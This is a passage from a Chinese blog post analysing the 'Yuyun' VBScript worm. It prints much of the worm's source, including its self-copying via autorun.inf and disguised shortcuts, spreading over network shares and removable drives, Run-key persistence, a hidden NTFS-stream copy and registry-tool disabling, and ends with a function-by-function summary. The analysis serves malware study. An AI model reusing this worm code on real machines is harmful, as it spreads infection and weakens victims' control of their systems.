class="hljs-keyword">On</span> <span class="hljs-keyword">Error</span> <span class="hljs-keyword">Resume</span> <span class="hljs-keyword">Next</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">day</span>(now)=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-built_in">month</span>(now)mod <span class="hljs-number">3</span>)=<span class="hljs-number">1</span> <span class="hljs-keyword">then</span> <br>rara.copy path+<span class="hljs-string">&quot;\Baca AQ.rtf&quot;</span><br>rara.copy path+<span class="hljs-string">&quot;\My name is Yuyun.rtf&quot;</span><br><span class="hljs-keyword">end</span> <span class="hljs-keyword">if</span><br><br>g1=path+<span class="hljs-string">&quot;\autorun.inf&quot;</span><br>g2=path+<span class="hljs-string">&quot;\Thumb.db&quot;</span><br><span class="hljs-keyword">If</span> fso.FileExists(g1) <span class="hljs-keyword">Then</span> <br>	<span class="hljs-keyword">Set</span> g11=fso.GetFile(g1) <br>	<span class="hljs-keyword">If</span> g11.Attributes&lt;&gt;<span class="hljs-number">39</span> <span class="hljs-keyword">Then</span> <br>		g11.Attributes=<span class="hljs-number">0</span><br>		auto.Copy path+<span class="hljs-string">&quot;\autorun.inf&quot;</span>,<span class="hljs-literal">True</span><br>	<span class="hljs-keyword">end</span> <span class="hljs-keyword">if</span><br><span class="hljs-keyword">else</span> <br>	auto.Copy path+<span class="hljs-string">&quot;\autorun.inf&quot;</span>,<span class="hljs-literal">True</span><br><span class="hljs-keyword">end</span> <span class="hljs-keyword">if</span><br><br><br><span class="hljs-keyword">If</span> fso.FileExists(g2) <span class="hljs-keyword">Then</span> <br>	<span class="hljs-keyword">Set</span> g12=fso.GetFile(g2)<br>	<span class="hljs-keyword">If</span> g12.Attributes&lt;&gt;<span class="hljs-number">39</span> <span class="hljs-keyword">Then</span><br>		g12.Attributes=<span class="hljs-number">0</span><br>		AQ.Copy path+<span class="hljs-string">&quot;\Thumb.db&quot;</span>,<span class="hljs-literal">True</span><br>	<span class="hljs-keyword">end</span> <span class="hljs-keyword">if</span><br><span class="hljs-keyword">else</span><br>	AQ.Copy path+<span class="hljs-string">&quot;\Thumb.db&quot;</span>,<span class="hljs-literal">True</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br><br><span class="hljs-keyword">If</span> <span class="hljs-keyword">Not</span> fso.FileExists(path+<span class="hljs-string">&quot;\Microsoft.lnk&quot;</span>) <span class="hljs-keyword">Then</span>              <span class="hljs-comment">&#x27;我的文档文件夹是否存在Microsoft.lnk</span><br>shorZvnita path+<span class="hljs-string">&quot;\Microsoft&quot;</span>,<span class="hljs-string">&quot;Microsoft&quot;</span><br>drop=<span class="hljs-built_in">Array</span>(<span class="hljs-string">&quot;New Harry Potter and...&quot;</span>,<span class="hljs-string">&quot;New Folder&quot;</span>,<span class="hljs-string">&quot;SuratQ&quot;</span>,<span class="hljs-string">&quot;Rahasia&quot;</span>,<span class="hljs-string">&quot;Game&quot;</span>,<span class="hljs-string">&quot;Zvnita&quot;</span>,<span class="hljs-string">&quot;Download&quot;</span>,<span class="hljs-string">&quot;DataQ&quot;</span>,<span class="hljs-string">&quot;DataQ&quot;</span>)    <span class="hljs-comment">&#x27;创建超链接文件</span><br>ww=<span class="hljs-number">1</span><br><span class="hljs-keyword">For</span> <span class="hljs-keyword">Each</span> d <span class="hljs-keyword">In</span> drop                      <br>	<span class="hljs-keyword">If</span> <span class="hljs-built_in">Day</span>(now) Mod <span class="hljs-number">3</span> = ww <span class="hljs-keyword">Then</span> shorZvnita path+<span class="hljs-string">&quot;\&quot;</span>+d,d<br>	wscript.sleep <span class="hljs-number">60</span><br>	ww=ww+<span class="hljs-number">1</span><br><span class="hljs-keyword">Next</span><br>r=<span class="hljs-number">0</span><br><span class="hljs-keyword">For</span> <span class="hljs-keyword">Each</span> fldr <span class="hljs-keyword">In</span> fso.GetFolder(path+<span class="hljs-string">&quot;\&quot;</span>).SubFolders        <span class="hljs-comment">&#x27;我的文档文件夹</span><br>	shorZvnita path+<span class="hljs-string">&quot;\&quot;</span>+fldr.name,fldr.Name<br>	wscript.sleep <span class="hljs-number">60</span><br><span class="hljs-keyword">If</span> r&gt;<span class="hljs-number">3</span> <span class="hljs-keyword">Then</span> <br>	<span class="hljs-keyword">Exit</span> <span class="hljs-keyword">For</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">if</span><br>r=r+<span class="hljs-number">1</span><br><span class="hljs-keyword">Next</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">Sub</span><br><br><span class="hljs-keyword">Sub</span> shorZvnita(path,trgt)                    <span class="hljs-comment">&#x27;创建超链接文件</span><br><span class="hljs-keyword">Set</span> shor=ws.CreateShortcut(path+<span class="hljs-string">&quot;.lnk&quot;</span>)<br>shor.iconlocation=<span class="hljs-string">&quot;shell32.dll,3&quot;</span><br>shor.targetpath=<span class="hljs-string">&quot;wscript.exe&quot;</span><br>shor.arguments=<span class="hljs-string">&quot;//e:VBScript thumb.db &quot;&quot;&quot;</span>+trgt+<span class="hljs-string">&quot;&quot;&quot;&quot;</span><br>shor.save<br><span class="hljs-keyword">End</span> <span class="hljs-keyword">Sub</span><br><br><span class="hljs-keyword">function</span> attack_net()<br>	<span class="hljs-keyword">On</span> <span class="hljs-keyword">Error</span> <span class="hljs-keyword">Resume</span> <span class="hljs-keyword">Next</span><br>	err.clear<br>	<span class="hljs-keyword">Set</span> objFolder = sh.Name<span class="hljs-built_in">space</span>(&amp;H13&amp;)              <span class="hljs-comment">&#x27;network shortcuts网络位置</span><br>	<span class="hljs-keyword">Set</span> colItems = objFolder.Items<br>	<span class="hljs-keyword">For</span> <span class="hljs-keyword">Each</span> strFileName <span class="hljs-keyword">in</span> objFolder.Items          <span class="hljs-comment">&#x27;遍历网络位置</span><br>	t= objFolder.GetDetailsOf(strFileName, <span class="hljs-number">14</span>)<br>	<span class="hljs-keyword">if</span> fso.folderexists(t) <span class="hljs-keyword">then</span>                      <span class="hljs-comment">&#x27;感染</span><br>		rekursif t,<span class="hljs-number">4</span><br>	<span class="hljs-keyword">end</span> <span class="hljs-keyword">if</span><br>	<span class="hljs-keyword">Next</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">function</span><br><br><span class="hljs-keyword">Sub</span> tdr()<br><span class="hljs-keyword">On</span> <span class="hljs-keyword">Error</span> <span class="hljs-keyword">Resume</span> <span class="hljs-keyword">Next</span><br>err.clear<br>WScript.Sleep <span class="hljs-number">180000</span><br><span class="hljs-keyword">if</span> err.number&gt;<span class="hljs-number">0</span> <span class="hljs-keyword">then</span> wscript.quit<br><span class="hljs-keyword">End</span> <span class="hljs-keyword">Sub</span><br><br><span class="hljs-keyword">function</span> UNISKA()                                <span class="hljs-comment">&#x27;写v.doc</span><br><span class="hljs-keyword">On</span> <span class="hljs-keyword">error</span> <span class="hljs-keyword">resume</span> <span class="hljs-keyword">next</span><br>x=vbcrlf<br>adv=<span class="hljs-string">&quot;Yuyun Ver 1.0 ^_^!==================&gt;&gt;Bukan dari tulang ubun ia dicipta&gt;karna berbahaya membiarkannya dalam sanjung dan puja&gt;tak juga dari tulang kaki&gt;karna nista membuatnya diinjak dan diperbudak&gt;tapi dari tulang rusuk bagian kiri&gt;dekat ke hati untuk disayangi&gt;dekat ke tangan untuk dilindungi&gt;&gt;(dikutip dr: Agar Bidadari Cemburu Padamu)&gt;&gt;&gt;&quot;&quot;Janganlah kamu bersikap lemah, dan janganlah (pula) kamu bersedih hati, padahal kamulah&gt;orang-orang yang paling tinggi (derajatnya), jika kamu orang-orang yang beriman.&quot;&quot;&gt;(QS. Ali Imran:139)&gt;&gt;&gt;Katakanlah kepada orang laki-laki yang beriman: &quot;&quot;Hendaklah mereka menahan pandanganya, &gt;dan memelihara kemaluannya; yang demikian itu adalah lebih suci bagi mereka, &gt;sesungguhnya Allah Maha Mengetahui apa yang mereka perbuat.&quot;&quot; (QS. An Nur:30)&gt;&gt;Katakanlah kepada wanita yang beriman: &quot;&quot;Hendaklah mereka menahan pandangannya, &gt;dan kemaluannya, dan janganlah mereka menampakkan perhiasannya, kecuali yang &gt;(biasa) nampak dari padanya. Dan hendaklah mereka menutupkan kain kudung &gt;kedadanya....&quot;&quot; (QS. An Nur:30)&gt;&gt;Sorry I just Nitip Print thok....Ndak pa2 khan^_^!  www.muslimah.or.id &gt;&gt;Hai anak Adam, sesungguhnya Kami telah menurunkan kepadamu &gt;pakaian untuk menutup auratmu dan pakaian indah untuk perhiasan.&gt;Dan pakaian takwa itulah yang paling baik. Yang demikian itu adalah &gt;sebahagian dari tanda-tanda kekuasaan Allah, mudah-mudahan mereka selalu ingat.(Al-A&#x27;raf:26)&quot;</span><br><br>adv=<span class="hljs-built_in">replace</span>(adv,<span class="hljs-string">&quot;&gt;&quot;</span>,x)<br><span class="hljs-keyword">set</span> Yu2n=fso.opentextfile(tmp+<span class="hljs-string">&quot;\v.doc&quot;</span>,<span class="hljs-number">2</span>,<span class="hljs-literal">true</span>)<br>Yu2n.write adv<br>Yu2n.close<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">day</span>(now)=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-built_in">month</span>(now)mod <span class="hljs-number">3</span>)=<span class="hljs-number">1</span> <span class="hljs-keyword">then</span> <br><span class="hljs-keyword">if</span> fly=<span class="hljs-literal">false</span> <span class="hljs-keyword">then</span><br><span class="hljs-keyword">for</span> i=<span class="hljs-number">1</span> <span class="hljs-keyword">to</span> <span class="hljs-number">3</span><br>ws.run <span class="hljs-string">&quot;notepad.exe /p &quot;&quot;&quot;</span>+tmp+<span class="hljs-string">&quot;\v.doc&quot;&quot;&quot;</span><br><span class="hljs-keyword">next</span><br><span class="hljs-keyword">end</span> <span class="hljs-keyword">if</span><br><span class="hljs-keyword">end</span> <span class="hljs-keyword">if</span><br><span class="hljs-keyword">set</span> UNISKA=fso.getfile(tmp+<span class="hljs-string">&quot;\v.doc&quot;</span>)<br><span class="hljs-keyword">end</span> <span class="hljs-keyword">function</span><br><br><span class="hljs-keyword">Sub</span> regQ()                                             <span class="hljs-comment">&#x27;修改注册表，设置桌面快捷方式、实现自启动</span><br><span class="hljs-keyword">On</span> <span class="hljs-keyword">Error</span> <span class="hljs-keyword">Resume</span> <span class="hljs-keyword">Next</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">day</span>(now)=<span class="hljs-number">1</span> <span class="hljs-keyword">then</span>                                     <span class="hljs-comment">&#x27;每月一日</span><br>ws.RegWrite <span class="hljs-string">&quot;HKCR\CLSID\&#123;11111111-2222-3333-4444-555555555555&#125;\&quot;</span>, <span class="hljs-string">&quot;Yuyun_Cantix&quot;</span><br>ws.RegWrite <span class="hljs-string">&quot;HKCR\CLSID\&#123;11111111-2222-3333-4444-555555555555&#125;\DefaultIcon\&quot;</span>,<span class="hljs-string">&quot;shell32.dll,48&quot;</span><br>ws.RegWrite <span class="hljs-string">&quot;HKCR\CLSID\&#123;11111111-2222-3333-4444-555555555555&#125;\ShellFolder\Attributes&quot;</span>,<span class="hljs-number">0</span>,<span class="hljs-string">&quot;REG_DWORD&quot;</span><br>ws.regwrite <span class="hljs-string">&quot;HKLM\Software\Microsoft\Windows\CurrentVersion\explorer\Desktop\NameSpace\&#123;11111111-2222-3333-4444-555555555555&#125;\&quot;</span>,<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">end</span> <span class="hljs-keyword">if</span><br>ws.regdelete <span class="hljs-string">&quot;HKCR\lnkfile\IsShortcut&quot;</span><br>ws.RegWrite <span class="hljs-string">&quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Explorer&quot;</span>,<span class="hljs-string">&quot;Wscript.exe //e:VBScript &quot;&quot;&quot;</span>+docx+<span class="hljs-string">&quot;\database.mdb&quot;&quot;&quot;</span><br>ws.RegWrite <span class="hljs-string">&quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistrytools&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&quot;REG_DWORD&quot;</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">lcase</span>(fso.getdrive(<span class="hljs-string">&quot;c:&quot;</span>).FileSystem)=<span class="hljs-string">&quot;ntfs&quot;</span> <span class="hljs-keyword">then</span><br>iraQ=AQ.openastextstream(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>).read(AQ.size)<br>www=fso.GetSpecialFolder(<span class="hljs-number">0</span>)<br><span class="hljs-keyword">set</span> jjk=fso.opentextfile(www+<span class="hljs-string">&quot;\:Microsoft Office Update for Windows XP.sys&quot;</span>,<span class="hljs-number">2</span>,<span class="hljs-literal">true</span>)<br>jjk.write iraQ<br>jjk.close<br>ws.RegWrite <span class="hljs-string">&quot;HKLM\Software\Microsoft\Windows\CurrentVersion\Run\WinUpdate&quot;</span>,<span class="hljs-string">&quot;Wscript.exe //e:VBScript &quot;&quot;&quot;</span>+www+<span class="hljs-string">&quot;\:Microsoft Office Update for Windows XP.sys&quot;&quot;&quot;</span>   <span class="hljs-comment">&#x27;自启动</span><br><span class="hljs-keyword">end</span> <span class="hljs-keyword">if</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">Sub</span><br><br><span class="hljs-keyword">Sub</span> Hertz(ooo)<br><span class="hljs-keyword">On</span> <span class="hljs-keyword">Error</span> <span class="hljs-keyword">Resume</span> <span class="hljs-keyword">Next</span><br><span class="hljs-keyword">do</span><br><span class="hljs-keyword">For</span> <span class="hljs-keyword">Each</span> drv <span class="hljs-keyword">In</span> fso.Drives     <span class="hljs-comment">&#x27;遍历驱动器</span><br><span class="hljs-keyword">If</span> drv.DriveType=<span class="hljs-number">1</span> <span class="hljs-keyword">Then</span>        <span class="hljs-comment">&#x27;可移动驱动器</span><br>rekursif drv.Path,<span class="hljs-number">4</span><br><span class="hljs-keyword">Else</span>                           <span class="hljs-comment">&#x27;其他驱动器</span><br>rekursif drv.Path,<span class="hljs-number">2</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">if</span><br><span class="hljs-keyword">Next</span><br><span class="hljs-keyword">if</span> fly=<span class="hljs-literal">false</span> <span class="hljs-keyword">then</span> <br>tdr<br><span class="hljs-keyword">else</span> <br>wscript.quit<br><span class="hljs-keyword">end</span> <span class="hljs-keyword">if</span><br>regQ<br><span class="hljs-keyword">If</span> ooo=<span class="hljs-literal">False</span> <span class="hljs-keyword">Then</span> <br><span class="hljs-keyword">Exit</span> <span class="hljs-keyword">Do</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br><span class="hljs-keyword">loop</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">Sub</span><br></code></pre></td></tr></table></figure>
+
+<p>主要函数功能如下：</p>
+<p><strong>Sub rekursif(path,dp)</strong> 负责递归目录，path是目录路径，dp是递归目录层数</p>
+<p><strong>Sub dropf(path)</strong> 负责复制传播的函数，主要就是复制autorun.inf、Thumb.db到目录下</p>
+<p><strong>Sub shorZvnita(path,trgt)</strong> 创建包含指定命令的超链接文件</p>
+<p><strong>function attack_net()</strong> 负责网络位置传播，即局域网内传播</p>
+<p><strong>Sub tdr()</strong> 负责错误检查</p>
+<p><strong>function UNISKA()</strong> 写入v.doc文件，包含指定内容，内容无实质意义</p>
+<p><strong>Sub regQ()</strong>   注册表操作，包括创建桌面快捷方式、开机自启动</p>
+<p><strong>Sub Hertz(ooo)</strong>  遍历驱动器，在本地和可移动介质目录进行复制传播</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>样本主要功能为：修改注册表，大量创建包含指定命令的超链接文件，复制病毒到主机文件夹目录下，并通过可移动介质盘和网络位置进行传播。总之，危害不大，传播性不强。但是这是第一次见到的纯vbs脚本病毒，以前遇见的vbs多作为中间衍生物或者下载器。</p>
+<h2 id=""><a href="#" class="headerlink" title=""></a></h2>
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/">样本分析</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/vbs/">vbs</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/06/02/blackice%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/">
+                        <span class="hidden-mobile">blackice病毒分析</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments" lazyload>
+                
+                  
+                
+                
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://unpkg.com/valine@1/dist/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"p4y64BT0Xe4gNN6V3D3J31XG-gzGzoHsz","appKey":"gaaGO0djz3T4tJHrM9kjHYMx","path":"window.location.pathname","placeholder":"随便说点什么吧~兄弟","avatar":"retro","meta":["nick"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":true,"recordIP":true,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":true},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          Fluid.plugins.initFancyBox('#valine .vcontent img:not(.vemoji)');
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <i class="iconfont icon-github-fill"></i> <a href="https://github.com/wangchenChina" target="_blank" rel="nofollow noopener"><span>Github</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://unpkg.com/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://unpkg.com/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://unpkg.com/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://unpkg.com/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://unpkg.com/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://unpkg.com/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+
+
+
+  <script  src="https://unpkg.com/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+        typing(title);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
